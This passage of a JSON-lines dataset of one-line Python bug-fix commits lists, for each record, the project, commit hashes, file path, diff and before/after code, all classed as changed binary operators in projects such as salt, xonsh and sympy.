[\"==:==\", 3, 21, 3, 23]]]"}
{"project": "l10n-switzerland", "commit_sha": "b731b88ea8904887b36f69d5c4ca14d7db92d1c2", "parent_sha": "e926ff732052c2eb2cfec31bf5af2d2a75d04897", "file_path": "l10n_ch_payment_slip/models/invoice.py", "project_url": "https://github.com/camptocamp/l10n-switzerland", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -158,7 +158,7 @@ class AccountInvoice(models.Model):\n                     msg.append(_('The bank account {} used in invoice has no '\n                                  'BVR/ESR adherent number.'\n                                  ).format(bank_acc.acc_number))\n-                if not bank_acc.acc_type != 'postal' or not bank_acc.ccp:\n+                if not bank_acc.acc_type == 'postal' or not bank_acc.ccp:\n                     msg.append(_('The bank account {} used in invoice needs to'\n                                  ' be a postal account or have a bank CCP.'\n                                  ).format(bank_acc.acc_number))\n", "before": "if not bank_acc . acc_type != 'postal' or not bank_acc . ccp : msg . append ( _ ( 'The bank account {} used in invoice needs to' ' be a postal account or have a bank CCP.' ) . format ( bank_acc . acc_number ) )", "after": "if not bank_acc . acc_type == 'postal' or not bank_acc . ccp : msg . append ( _ ( 'The bank account {} used in invoice needs to' ' be a postal account or have a bank CCP.' ) . format ( bank_acc . acc_number ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 24, 3, 53], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 42, 3, 44]]]"}
{"project": "l10n-switzerland", "commit_sha": "069210ac26a039e4ccbac0efbbb48f2d5407285e", "parent_sha": "6179b89d1e022f4e51841eae2b4fe059223ae708", "file_path": "l10n_ch_payment_slip/invoice.py", "project_url": "https://github.com/camptocamp/l10n-switzerland", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -155,7 +155,7 @@ class AccountInvoice(Model):\n         return True\n \n     def _action_bvr_number_move(self, cr, uid, invoice, move, ref, context=None):\n-        if not (move or ref):\n+        if not (move and ref):\n             return\n         cr.execute('UPDATE account_move_line SET transaction_ref=%s'\n", "before": "if not ( move or ref ) : return", "after": "if not ( move and ref ) : return", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 17, 3, 28], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 22, 3, 24]]]"}
{"project": "mapproxy", "commit_sha": "ec2a98b1c198958d42f2733b11c802b7b1ca7809", "parent_sha": "214e350281ccb813447e5d953d1404d72096d0d5", "file_path": "mapproxy/config/loader.py", "project_url": "https://github.com/camptocamp/mapproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -653,7 +653,7 @@ class WMSLayerConfiguration(ConfigurationBase):\n         if 'sources' in self.conf:\n             this_layer = LayerConfiguration(self.conf, self.context).wms_layer()\n         \n-        if not layers or not this_layer:\n+        if not layers and not this_layer:\n             raise ValueError('wms layer requires sources and/or layers')\n         \n         if not layers:\n", "before": "if not layers or not this_layer : raise ValueError ( 'wms layer requires sources and/or layers' )", "after": "if not layers and not this_layer : raise ValueError ( 'wms layer requires sources and/or layers' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 40], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 23, 3, 25]]]"}
{"project": "mapproxy", "commit_sha": "9234c794c8c270ea0a70a42ef83dff85d5038610", "parent_sha": "9b7d92a8d40cd9dab613977c59b3646e8cb1b5b6", "file_path": "mapproxy/config/loader.py", "project_url": "https://github.com/camptocamp/mapproxy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -635,7 +635,7 @@ class WMSLayerConfiguration(ConfigurationBase):\n         if 'sources' in self.conf:\n             this_layer = LayerConfiguration(self.conf, self.context).wms_layer()\n         \n-        if not layers or not this_layer:\n+        if not layers and not this_layer:\n             raise ValueError('wms layer requires sources and/or layers')\n         \n         if not layers:\n", "before": "if not layers or not this_layer : raise ValueError ( 'wms layer requires sources and/or layers' )", "after": "if not layers and not this_layer : raise ValueError ( 'wms layer requires sources and/or layers' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 40], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 23, 3, 25]]]"}
{"project": "keystone", "commit_sha": "6bf78255b2529fd3a83e749101130cf595f1544e", "parent_sha": "f45b3e5e0000f33c3da0349a0f475d5de71ee9de", "file_path": "keystone/token/persistence/backends/sql.py", "project_url": "https://github.com/promptworks/keystone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -269,7 +269,7 @@ class Token(token.persistence.Driver):\n         total_removed = 0\n         upper_bound_func = timeutils.utcnow\n         for expiry_time in expiry_range_func(session, upper_bound_func):\n-            delete_query = query.filter(TokenModel.expires <\n+            delete_query = query.filter(TokenModel.expires <=\n                                         expiry_time)\n             row_count = delete_query.delete(synchronize_session=False)\n             total_removed += row_count\n", "before": "delete_query = query . filter ( TokenModel . expires < expiry_time )", "after": "delete_query = query . filter ( TokenModel . expires <= expiry_time )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 41, 4, 52], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 60, 3, 61]]]"}
{"project": "omnomnorth", "commit_sha": "824cca4ff9e0972ad0c5ad04a8388e36cb9c9ad6", "parent_sha": "15187f7c2cfa42644e914e8921ecdb1bc30efc6c", "file_path": "location/LocationParser.py", "project_url": "https://github.com/lab11/omnomnorth", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ class LocationParser ():\n \t\t\t\t\t\te_hour += 12\n \n \t\t\t# Check if the place is open after midnight\n-\t\t\tif e_hour < s_hour:\n+\t\t\tif e_hour <= s_hour:\n \t\t\t\t# add 12 hours until we get to the next day\n \t\t\t\twhile e_hour < 24:\n \t\t\t\t\te_hour += 12\n", "before": "if e_hour < s_hour : while e_hour < 24 : e_hour += 12", "after": "if e_hour <= s_hour : while e_hour < 24 : e_hour += 12", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 7, 3, 22], [\"<=:<=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 14, 3, 15]]]"}
{"project": "pyart", "commit_sha": "473f3889f2e3364c76f66870bc5ac87220a3abb3", "parent_sha": "9f9285f87e18de38ae82c17f52dfc93749b1a3f6", "file_path": "pyart/correct/phase_proc.py", "project_url": "https://github.com/simepar/pyart", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -625,7 +625,7 @@ def LP_solver_cvxopt(A_Matrix, B_vectors, weights, solver='glpk'):\n     from cvxopt import matrix, solvers\n-    n_gates = weights.shape[1]/2\n+    n_gates = weights.shape[1] // 2\n     n_rays = B_vectors.shape[0]\n     mysoln = np.zeros([n_rays, n_gates])\n \n", "before": "n_gates = weights . shape [ 1 ] / 2", "after": "n_gates = weights . shape [ 1 ] // 2", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 1, 15, 1, 33], [\"//://\", \"T\"], 1], [\"Delete\", [\"/:/\", 1, 31, 1, 32]]]"}
{"project": "sympy", "commit_sha": "1406c094fcec16c401471a1ea04a4cc9726fdae4", "parent_sha": "226b942f0748819d5d2d723b91591fed4975961c", "file_path": "sympy/holonomic/holonomic.py", "project_url": "https://github.com/schymans/sympy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2807,7 +2807,7 @@ def _shift(func, s):\n         a = d[b]\n \n         t = b.as_base_exp()\n-        b = t[1] if t[0] is x else S.Zero\n+        b = t[1] if t[0] == x else S.Zero\n         r = s / b\n         an = (i + r for i in func.args[0][0])\n         ap = (i + r for i in func.args[0][1])\n", "before": "b = t [ 1 ] if t [ 0 ] is x else S . Zero", "after": "b = t [ 1 ] if t [ 0 ] == x else S . Zero", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 21, 3, 30], [\"==:==\", \"T\"], 1], [\"Delete\", [\"is:is\", 3, 26, 3, 28]]]"}
{"project": "scipy", "commit_sha": "73245bf26b06b07c44ebddb8af76ea90340af669", "parent_sha": "10d88c4a57bb2c830aaf78f9f83bf046e232515e", "file_path": "scipy/ndimage/measurements.py", "project_url": "https://github.com/droyed/scipy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -156,7 +156,7 @@ def label(input, structure=None, output=None):\n     # Use 32 bits if it's large enough for this image.\n     # _ni_label.label()  needs two entries for background and\n     # foreground tracking\n-    need_64bits = input.size < (2**31 - 2)\n+    need_64bits = input.size >= (2**31 - 2)\n \n     if isinstance(output, numpy.ndarray):\n         if output.shape != input.shape:\n", "before": "need_64bits = input . size < ( 2 ** 31 - 2 )", "after": "need_64bits = input . size >= ( 2 ** 31 - 2 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 19, 3, 43], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 30, 3, 31]]]"}
{"project": "xonsh", "commit_sha": "1310e9210abf4b7bc522db452d44985c8d829c4f", "parent_sha": "55b4251672732781c32b031bb5a7a6e62d8d5409", "file_path": "xonsh/imphooks.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ class XonshImportHook(MetaPathFinder, SourceLoader):\n         for p in path:\n             if not isinstance(p, str):\n                 continue\n-            if not os.path.isdir(p) and not os.access(p, os.R_OK):\n+            if not os.path.isdir(p) or not os.access(p, os.R_OK):\n                 continue\n             if fname not in (x.name for x in scandir(p)):\n                 continue\n", "before": "if not os . path . isdir ( p ) and not os . access ( p , os . R_OK ) : continue", "after": "if not os . path . isdir ( p ) or not os . access ( p , os . R_OK ) : continue", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 20, 3, 66], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 37, 3, 40]]]"}
{"project": "pyethereum", "commit_sha": "2cd01ff1b3720649cfeb06ad4689b6e66d3910f1", "parent_sha": "3935643ac407e93235bff3c4f50db0c189db1c14", "file_path": "ethereum/blocks.py", "project_url": "https://github.com/PabloLefort/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -93,9 +93,9 @@ def calc_difficulty(parent, timestamp):\n     o = int(max(parent.difficulty + offset * sign, min(parent.difficulty, MIN_DIFF)))\n     period_count = (parent.number + 1) // EXPDIFF_PERIOD\n     if period_count >= EXPDIFF_FREE_PERIODS:\n-        o = max(o - 2**(period_count - EXPDIFF_FREE_PERIODS), MIN_DIFF)\n+        o = max(o + 2**(period_count - EXPDIFF_FREE_PERIODS), MIN_DIFF)\n     return o\n-        \n+\n \n \n class Account(rlp.Serializable):\n", "before": "o = max ( o - 2 ** ( period_count - EXPDIFF_FREE_PERIODS ) , MIN_DIFF )", "after": "o = max ( o + 2 ** ( period_count - EXPDIFF_FREE_PERIODS ) , MIN_DIFF )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 17, 3, 61], [\"+:+\", \"T\"], 1], [\"Delete\", [\"-:-\", 3, 19, 3, 20]]]"}
{"project": "xonsh", "commit_sha": "6dd55b736cc2e616d1bcca184b6dc2e460b787ca", "parent_sha": "0ec02095acd16b07597cc0317dbf525a32880459", "file_path": "xonsh/completer.py", "project_url": "https://github.com/nicfit/xonsh", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -81,7 +81,7 @@ class Completer(object):\n                 if os.path.isdir(s.rstrip()):\n                     s = s.rstrip() + slash\n                 rtn.add(s)\n-            if len(rtn) != 0:\n+            if len(rtn) == 0:\n                 rtn = self.path_complete(prefix)\n             return sorted(rtn)\n         elif cmd not in ctx and cmd not in XONSH_TOKENS:\n", "before": "if len ( rtn ) != 0 : rtn = self . path_complete ( prefix )", "after": "if len ( rtn ) == 0 : rtn = self . path_complete ( prefix )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 29], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 25, 3, 27]]]"}
{"project": "new_edx", "commit_sha": "c8d267fb72b6dd6e9e42435f8609eb6e0b5ad48d", "parent_sha": "a9ca84da6b6901d02a6c0b5683988f1bc2aa93a6", "file_path": "lms/djangoapps/courseware/access.py", "project_url": "https://github.com/syjeon/new_edx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -325,7 +325,7 @@ def _course_staff_group_name(location):\n     if _does_course_group_name_exist(legacy_name):\n         return legacy_name\n \n-    return 'staff_%s' & loc.course_id\n+    return 'staff_%s' % loc.course_id\n \n \n def _course_instructor_group_name(location):\n", "before": "return 'staff_%s' & loc . course_id", "after": "return 'staff_%s' % loc . course_id", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 12, 3, 38], [\"%:%\", \"T\"], 1], [\"Delete\", [\"&:&\", 3, 23, 3, 24]]]"}
{"project": "Sick-Beard", "commit_sha": "313cc9010506ac73b07f17417ffdd28f2ca31fed", "parent_sha": "763754e0308f6eaf2e9b7546e90ae7b50d0aa36b", "file_path": "sickbeard/searchBacklog.py", "project_url": "https://github.com/SickBay/Sick-Beard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -132,7 +132,7 @@ class BacklogSearcher:\n \r\n         # don't consider this an actual backlog search if we only did recent eps\r\n         # or if we only did certain shows\r\n-        if fromDate == datetime.date.fromordinal(1) or not which_shows:\r\n+        if fromDate == datetime.date.fromordinal(1) and not which_shows:\r\n             self._set_lastBacklog(curDate)\r\n \r\n         self.amActive = False\r\n", "before": "if fromDate == datetime . date . fromordinal ( 1 ) or not which_shows : self . _set_lastBacklog ( curDate )", "after": "if fromDate == datetime . date . fromordinal ( 1 ) and not which_shows : self . _set_lastBacklog ( curDate )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 12, 3, 71], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 53, 3, 55]]]"}
{"project": "meltpack", "commit_sha": "07d6d55fdf9830912e3e0c0fc291ce41b3eede63", "parent_sha": "8e810d0ba1ec12b4f0d1d961ffbeea5b89ec8b91", "file_path": "src/MELTPACK/dhdt.py", "project_url": "https://github.com/njwilson23/meltpack", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,6 +61,6 @@ def lagrangian_dhdt(g1, g2, uvel, vvel, timespan=datetime.timedelta(days=1)):\n     z2 = g2.sample(x+dx, y+dy)\n \n     # limit results to where data exists in both grids\n-    m = ~np.isnan(z1) | ~np.isnan(z2)\n+    m = ~np.isnan(z1) & ~np.isnan(z2)\n     return np.vstack([x[m], y[m], dx[m], dy[m], z1[m], z2[m]])\n \n", "before": "m = ~ np . isnan ( z1 ) | ~ np . isnan ( z2 )", "after": "m = ~ np . isnan ( z1 ) & ~ np . isnan ( z2 )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 9, 3, 38], [\"&:&\", \"T\"], 1], [\"Delete\", [\"|:|\", 3, 23, 3, 24]]]"}
{"project": "bottomly", "commit_sha": "2b7a307972f4bca81297048ccbb4d2a36f0dd0eb", "parent_sha": "421fa176de1333cf2a3f2f1040acc0e991a7cf14", "file_path": "commands/google_search.py", "project_url": "https://github.com/Sharkwald/bottomly", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -4,7 +4,7 @@ from googleapiclient.discovery import build\n \n class GoogleSearchCommand(object):\n     def execute(self, search_term):\n-        if search_term == None or search_term == '':\n+        if search_term is None or search_term == '':\n             return None\n         service = build(\"customsearch\", \"v1\", developerKey=self.api_key)\n         results = service.cse().list(q=search_term, cx=self.cse_id, num=1).execute()\n", "before": "if search_term == None or search_term == '' : return None", "after": "if search_term is None or search_term == '' : return None", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 31], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 24, 3, 26]]]"}
{"project": "mlbpool2", "commit_sha": "af3a2b591d0757e9082c74c3f6b2735e6148e29a", "parent_sha": "a18f1c30a93af1686015689f10dae663cc10deae", "file_path": "mlbpool/controllers/picks_controller.py", "project_url": "https://github.com/prcutler/mlbpool2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class PicksController(BaseController):\n         now_time = pendulum.now(tz=pendulum.timezone('America/New_York')).to_datetime_string()\n \n         # Check if the season has already started\n-        if now_time < time_due:\n+        if now_time > time_due:\n             print(\"Too late!  The season has already started.\")\n             self.redirect('/picks/too-late')\n \n", "before": "if now_time < time_due : print ( \"Too late!  The season has already started.\" ) self . redirect ( '/picks/too-late' )", "after": "if now_time > time_due : print ( \"Too late!  The season has already started.\" ) self . redirect ( '/picks/too-late' )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 31], [\">:>\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 21, 3, 22]]]"}
{"project": "salt", "commit_sha": "494f0a441c57f7ccf1d8c9e3e000979ba9cdcd3e", "parent_sha": "8713c1b056d1c391f9958f8b23e480d0af726705", "file_path": "salt/returners/pgjsonb.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -258,7 +258,7 @@ def _get_serv(ret=None, commit=False):\n     except psycopg2.OperationalError as exc:\n         raise salt.exceptions.SaltMasterError('pgjsonb returner could not connect to database: {exc}'.format(exc=exc))\n \n-    if conn.server_version is not None or conn.server_version >= 90500:\n+    if conn.server_version is not None and conn.server_version >= 90500:\n         global PG_SAVE_LOAD_SQL\n", "before": "if conn . server_version is not None or conn . server_version >= 90500 : global PG_SAVE_LOAD_SQL", "after": "if conn . server_version is not None and conn . server_version >= 90500 : global PG_SAVE_LOAD_SQL", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 71], [\"and:and\", \"T\"], 1], [\"Delete\", [\"or:or\", 3, 40, 3, 42]]]"}
{"project": "salt", "commit_sha": "7ba2dd055c44cbab0a88caf42b74377cc2414fed", "parent_sha": "fcd105ad423e68e4bbd6a0b64522a16143f0aba3", "file_path": "salt/states/nxos.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ def user_present(name, password=None, roles=None, encrypted=False, crypt_salt=No\n     correct_roles = True\n     if roles is not None:\n         cur_roles = __salt__['nxos.cmd']('get_roles', username=name)\n-        correct_roles = set(roles) != set(cur_roles)\n+        correct_roles = set(roles) == set(cur_roles)\n \n     if not correct_roles:\n         ret['comment'] = 'Failed to set correct roles'\n", "before": "correct_roles = set ( roles ) != set ( cur_roles )", "after": "correct_roles = set ( roles ) == set ( cur_roles )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 25, 3, 53], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 36, 3, 38]]]"}
{"project": "twitter-sort", "commit_sha": "88c93a62bd37acc735d07d3cbaa43f91cd384a82", "parent_sha": "c9a13dc13f67f51e3d23a54a8176a56bba5838be", "file_path": "main.py", "project_url": "https://github.com/exPHAT/twitter-sort", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ class ReplyListener(tweepy.StreamListener):\n \t\t\t\t\tbreak\n \t\t\tfor i in range(len(givenNumbers)):\n \t\t\t\tif i > 0:\n-\t\t\t\t\tif not givenNumbers[i] > givenNumbers[i-1]:\n+\t\t\t\t\tif not givenNumbers[i] >= givenNumbers[i-1]:\n \t\t\t\t\t\tareSorted = False\n \t\t\t\t\t\tbreak\n \n", "before": "if not givenNumbers [ i ] > givenNumbers [ i - 1 ] : areSorted = False break", "after": "if not givenNumbers [ i ] >= givenNumbers [ i - 1 ] : areSorted = False break", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 13, 3, 48], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 29, 3, 30]]]"}
{"project": "pootle", "commit_sha": "4fc373be8daf5e0ee616fa68367975cd045dc1a6", "parent_sha": "576e396d992d32910cd5adbaad14dee8a18bc669", "file_path": "pootle/i18n/gettext_live.py", "project_url": "https://github.com/mindcandy/pootle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ def get_live_translation(language_code):\n     return _translation_project_cache[language_code]\n \n def _dummy_translate(singular, plural, n):\n-    if plural is not None and n > 1:\n+    if plural is not None and n != 1:\n         return plural\n     else:\n         return singular\n", "before": "if plural is not None and n > 1 : return plural else : return singular", "after": "if plural is not None and n != 1 : return plural else : return singular", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 31, 3, 36], [\"!=:!=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 33, 3, 34]]]"}
{"project": "salt", "commit_sha": "a8873d0427fabfaab3c2239067c6d5b06c1539e0", "parent_sha": "d29bb2f24a5738161f08ef1d31081367ba382e68", "file_path": "salt/modules/blockdev.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -54,7 +54,7 @@ def tune(device, **kwargs):\n                 args.append(switch.replace('set', 'get'))\n             else:\n                 args.append('getro')\n-            if kwargs[key] == 'True' or kwargs[key] == True:\n+            if kwargs[key] == 'True' or kwargs[key] is True:\n                 opts += '--{0} '.format(key)\n             else:\n                 opts += '--{0} {1} '.format(switch, kwargs[key])\n", "before": "if kwargs [ key ] == 'True' or kwargs [ key ] == True : opts += '--{0} ' . format ( key ) else : opts += '--{0} {1} ' . format ( switch , kwargs [ key ] )", "after": "if kwargs [ key ] == 'True' or kwargs [ key ] is True : opts += '--{0} ' . format ( key ) else : opts += '--{0} {1} ' . format ( switch , kwargs [ key ] )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 41, 3, 60], [\"is:is\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 53, 3, 55]]]"}
{"project": "salt", "commit_sha": "a91e8d9895cf3da44df7d9bb3fb460d4452a6c93", "parent_sha": "4b6a4aa3a9426092fee95089a3573bd3d14a9cd3", "file_path": "salt/modules/solarisips.py", "project_url": "https://github.com/Mattlk13/salt", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -37,7 +37,7 @@ def __virtual__():\n     '''\n     Set the virtual pkg module if the os is Solaris 11\n     '''\n-    if __grains__['os'] == 'Solaris' and float(__grains__['kernelrelease']) == 5.10:\n+    if __grains__['os'] == 'Solaris' and float(__grains__['kernelrelease']) > 5.10:\n         return __virtualname__\n     return False\n \n", "before": "if __grains__ [ 'os' ] == 'Solaris' and float ( __grains__ [ 'kernelrelease' ] ) == 5.10 : return __virtualname__", "after": "if __grains__ [ 'os' ] == 'Solaris' and float ( __grains__ [ 'kernelrelease' ] ) > 5.10 : return __virtualname__", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 42, 3, 84], [\">:>\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 77, 3, 79]]]"}
{"project": "proximitymarketing", "commit_sha": "ce08f4f695b4e37bc97888cdfe91a731be9efdd0", "parent_sha": "821c93eaec1524552e4923b7c9e6dfc681e12faa", "file_path": "openproximity2/django-web/openproximity/models.py", "project_url": "https://github.com/Nyophyte/proximitymarketing", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -287,7 +287,7 @@ class MarketingCampaign(Campaign):\n \t\n \t# test for successful uploads\n \taccepted_pass = self.accepted_count == -1 or (\n-\t    self.accepted_count < self.getAcceptedCount()\n+\t    self.accepted_count > self.getAcceptedCount()\n \t)\n \tlogger.debug(\"accepted_pass %s\" % accepted_pass)\n \tif not accepted_pass:\n", "before": "accepted_pass = self . accepted_count == - 1 or ( self . accepted_count < self . getAcceptedCount ( ) )", "after": "accepted_pass = self . accepted_count == - 1 or ( self . accepted_count > self . getAcceptedCount ( ) )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 6, 3, 51], [\">:>\", \"T\"], 1], [\"Delete\", [\"<:<\", 3, 26, 3, 27]]]"}
{"project": "madis", "commit_sha": "9ed8946cb54ef2df3042e33be90141e40d1fbe89", "parent_sha": "7d3dbc2bf8ff37bcba1f52c19440260b79284661", "file_path": "src/functions/aggregate/jpacks.py", "project_url": "https://github.com/HBPMedical/madis", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -261,7 +261,7 @@ class jgroupuniquelimit:\n         if self.k == None:\n             self.gset.update( [ (x,None) for x in jopts.fromj(args[0]) ] )\n             \n-            if len(self.gset) > args[-1]:\n+            if len(self.gset) >= args[-1]:\n                 self.k = args[1]\n \n     def final(self):\n", "before": "if len ( self . gset ) > args [ - 1 ] : self . k = args [ 1 ]", "after": "if len ( self . gset ) >= args [ - 1 ] : self . k = args [ 1 ]", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 16, 3, 41], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 31, 3, 32]]]"}
{"project": "python-icat", "commit_sha": "418673dc39e1c9d790d1158e121804d303d684a5", "parent_sha": "6282907b2b19d6ef96795d7304e3df2aabc78588", "file_path": "tests/test_07_client_options.py", "project_url": "https://github.com/icatproject/python-icat", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -62,4 +62,4 @@ def test_client_set_transport(setupicat):\n     transport = MyHTTPSTransport(client.sslContext, proxy=proxy)\n     client.set_options(transport=transport)\n     client.login(conf.auth, conf.credentials)\n-    assert transport.sendCounter == 1\n+    assert transport.sendCounter >= 1\n", "before": "assert transport . sendCounter == 1", "after": "assert transport . sendCounter >= 1", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 38], [\">=:>=\", \"T\"], 1], [\"Delete\", [\"==:==\", 3, 34, 3, 36]]]"}
{"project": "svcshare", "commit_sha": "71a4c2399786f7a9ae9c5a3098964ac68ad99589", "parent_sha": "ce7e966e6eb555fdd6549144cddf51549d2dc2b6", "file_path": "ssclient.py", "project_url": "https://github.com/msparks/svcshare", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -614,7 +614,7 @@ class Bot(irclib.SimpleIRCClient):\n       # Not a well-formed message.\n       return\n \n-    if len(msg) > 3:\n+    if len(msg) >= 3:\n       message = ' '.join(msg[2:])\n     else:\n       message = ''\n", "before": "if len ( msg ) > 3 : message = ' ' . join ( msg [ 2 : ] ) else : message = ''", "after": "if len ( msg ) >= 3 : message = ' ' . join ( msg [ 2 : ] ) else : message = ''", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 8, 3, 20], [\">=:>=\", \"T\"], 1], [\"Delete\", [\">:>\", 3, 17, 3, 18]]]"}
{"project": "zeus", "commit_sha": "946564783668f8151381bd52263ed38a6604c734", "parent_sha": "291cb9bd7e0932a35331592cd9240a1e41c7979d", "file_path": "zeus/model_features.py", "project_url": "https://github.com/itminedu/zeus", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ class ElectionFeatures(FeaturesMixin):\n     @election_feature()\n     def _feature_pending_issues(self):\n         pending = len(self.election_issues_before_freeze) > 0\n-        return pending and self.feature_pending_polls_issues\n+        return pending or self.feature_pending_polls_issues\n \n     @election_feature()\n     def _feature_can_add_poll(self):\n", "before": "return pending and self . feature_pending_polls_issues", "after": "return pending or self . feature_pending_polls_issues", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 16, 3, 61], [\"or:or\", \"T\"], 1], [\"Delete\", [\"and:and\", 3, 24, 3, 27]]]"}
{"project": "rodrigodeoliveiracosta-clone", "commit_sha": "895d877e3eb7d69502bb06101435de2bd6a28417", "parent_sha": "924c465bd4cbe05f9b7d4ce2f3878ab9ff6ba80c", "file_path": "fanficdownloader/writers/base_writer.py", "project_url": "https://github.com/rodrigonz/rodrigodeoliveiracosta-clone", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -188,7 +188,7 @@ class BaseStoryWriter(Configurable):\n             self.story.addToList(\"extratags\",tag)\r\n \r\n         self.metaonly = metaonly\r\n-        if outfilename != None:\r\n+        if outfilename == None:\r\n             outfilename=self.getOutputFileName()\r\n \r\n         if not outstream:\r\n", "before": "if outfilename != None : outfilename = self . getOutputFileName ( )", "after": "if outfilename == None : outfilename = self . getOutputFileName ( )", "sstub_pattern": "CHANGE_BINARY_OPERATOR", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 12, 3, 31], [\"==:==\", \"T\"], 1], [\"Delete\", [\"!=:!=\", 3, 24, 3, 26]]]"}
